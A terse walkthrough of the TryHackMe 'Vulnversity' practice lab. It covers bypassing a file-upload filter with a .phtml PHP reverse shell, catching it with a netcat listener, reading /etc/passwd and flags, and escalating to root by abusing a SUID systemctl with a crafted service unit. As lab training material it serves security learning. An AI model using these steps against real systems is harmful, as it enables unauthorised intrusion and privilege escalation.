---
title: vulnversity
---

# TASK 1 - DEPLOY

# TASK 2 - RECON

```bash
$ nmap
```

# TASK 3 - DIRECTORIES

```bash
$ gobuster
```

# TASK 4 - COMPROMISE

```bash
$ touch phpext.txt
$ nano phpext.txt
# browser: http://10.10.93.31:3333/internal/
# burpsuite stuff
$ mv php-reverse-shell.php php-reverse-shell.phtml
# browser: upload phtml to http://10.10.93.31:3333/internal/
$ nc -lvnp 1234 # 1234 is port in file
listening on [any] 1234 ...
# browser: 10.10.93.31:3333/internal/uploads/php-reverse-shell.phtml
connect to [10.4.5.126] from (UNKNOWN) [10.10.93.31] 37820
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 20:26:49 up 17 min,  0 users,  load average: 0.00, 0.06, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off # actually can't
# begin remote shell
$ cat /etc/passwd/ # find bill
$ ls /home/bill/
$ cat /home/bill/user.txt # find flag
```

# TASK 5 - PRIVILEGE ESCALATION

```bash
# find the right process
$ find / -perm -4000 2>/dev/null # from tryhackme blog writeup
# hint gives find / -user root -perm -4000 -exec ls -ldb {} \; but above is cleaner

$ ls -la /bin/systemctl
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl

# create a service than cats root.txt to something this user can read
$ var=$(mktemp).service
$ echo '[Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/root.txt"
> 
> [Install]
> WantedBy=multi-user.target' > $var

$ cat $var
[Service]
ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/root.txt"

[Install]
WantedBy=multi-user.target

$ /bin/systemctl link $var
Created symlink from /etc/systemd/system/tmp.4M2wizYSM8.service to /tmp/tmp.4M2wizYSM8.service.
$ /bin/systemctl enable --now $var
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.4M2wizYSM8.service to /tmp/tmp.4M2wizYSM8.service.

$ cat /tmp/root.txt
a58ff8579f0a9270368d33a9966c7fd5
```